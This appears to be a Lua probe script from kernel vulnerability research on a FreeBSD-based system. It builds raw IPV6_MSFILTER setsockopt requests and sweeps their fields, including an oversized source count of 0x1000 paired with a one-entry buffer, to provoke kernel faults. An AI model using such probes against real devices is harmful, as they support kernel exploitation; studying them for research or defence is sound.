-- CRASH_CLASS: MODERATE
-- PROBE 982a: IPV6_MSFILTER with the correctly aligned request
--
-- docs/research/IPV6_CORRECTION_FOR_RESEARCHER.md:24-25 records that 50e was
-- rejected at the interface-lookup stage with a 148-byte request, and that the
-- lane stays open until a correctly formed one is sent. On amd64 the FreeBSD
-- struct __msfilterreq is 152 bytes: ifindex(4) fmode(4) nsrcs(4) pad(4)
-- group(sockaddr_storage 128) srcs(pointer 8). This builds exactly that, joins
-- the group first, and sweeps nsrcs and fmode.

print("=== PROBE 982a: IPV6_MSFILTER, 152-BYTE REQUEST ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function ret(tag, ok, rv) if not ok then print("  ["..tag.."] PCALL-FAIL") return nil end local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l)) return l end

print(string.format("[A] pid=%d", to_num(mk(20)())))
local fd = ret("socket6", pcall(function() return mk(97)(uint64(28),uint64(2),uint64(0)) end))
if not fd or fd < 0 then print("no socket"); return end

-- bind to ::1 so the interface lookup has a local address
local BA = memory.alloc(0x1C)
for i=0,0x1B do wb(BA+i, 0) end
wb(BA, 0x1C) wb(BA+1, 28)
wb(BA+15, 1)              -- ::1
wb(BA+16, 0) wb(BA+17, 0)
ret("bind(::1:0)", pcall(function() return mk(104)(uint64(fd),uint64(addr_of(BA)),uint64(0x1C)) end))

-- group ff02::1
local G = memory.alloc(0x1C)
for i=0,0x1B do wb(G+i, 0) end
wb(G, 0x1C) wb(G+1, 28)
wb(G+8, 0xFF) wb(G+9, 0x02)
wb(G+24, 0) wb(G+25, 0) wb(G+26, 0) wb(G+27, 0) wb(G+28, 0) wb(G+29, 0) wb(G+30, 0) wb(G+31, 1)
ret("IPV6_JOIN_GROUP", pcall(function() return mk(105)(uint64(fd),uint64(41),uint64(20),uint64(addr_of(G)),uint64(0x1C)) end))

local R = memory.alloc(0x98)    -- 152 bytes
local SRC = memory.alloc(0x80)  -- one sockaddr_storage

local function build(nsrcs, fmode, withsrc)
    for i=0,0x97 do wb(R+i, 0) end
    wd(R+0x00, 1)          -- ifindex
    wd(R+0x04, fmode)      -- 1 = INCLUDE, 2 = EXCLUDE
    wd(R+0x08, nsrcs)
    -- group at +0x10, sockaddr_storage
    local g = R + 0x10
    wb(g, 0x1C) wb(g+1, 28)
    wb(g+8, 0xFF) wb(g+9, 0x02)
    wb(g+31, 1)
    -- srcs pointer at +0x90
    if withsrc then
        wd(R+0x90, addr_of(SRC) % 4294967296)
        wd(R+0x94, math.floor(addr_of(SRC)/4294967296))
        wb(SRC, 0x1C) wb(SRC+1, 28)
        wb(SRC+8, 0x20) wb(SRC+9, 0x01)
        wb(SRC+24, 0) wb(SRC+25, 0) wb(SRC+26, 0) wb(SRC+27, 0) wb(SRC+28, 0) wb(SRC+29, 0) wb(SRC+30, 0) wb(SRC+31, 1)
    end
end

print("[B] IPV6_MSFILTER (74) sweep")
for _, c in ipairs({{0,1,false},{0,2,false},{1,1,true},{1,2,true},{2,1,true},{0x1000,1,true}}) do
    build(c[1], c[2], c[3])
    ret(string.format("MSFILTER nsrcs=%d fmode=%d", c[1], c[2]),
        pcall(function() return mk(105)(uint64(fd),uint64(41),uint64(74),uint64(addr_of(R)),uint64(0x98)) end))
end

print("[C] MCAST_JOIN_SOURCE_GROUP (81) for comparison")
build(1, 1, true)
ret("MCAST_JOIN_SOURCE_GROUP", pcall(function() return mk(105)(uint64(fd),uint64(41),uint64(81),uint64(addr_of(R)),uint64(0x98)) end))

print(string.format("[Z] alive pid=%d", to_num(mk(20)())))
print("=== COMPLETE ===")
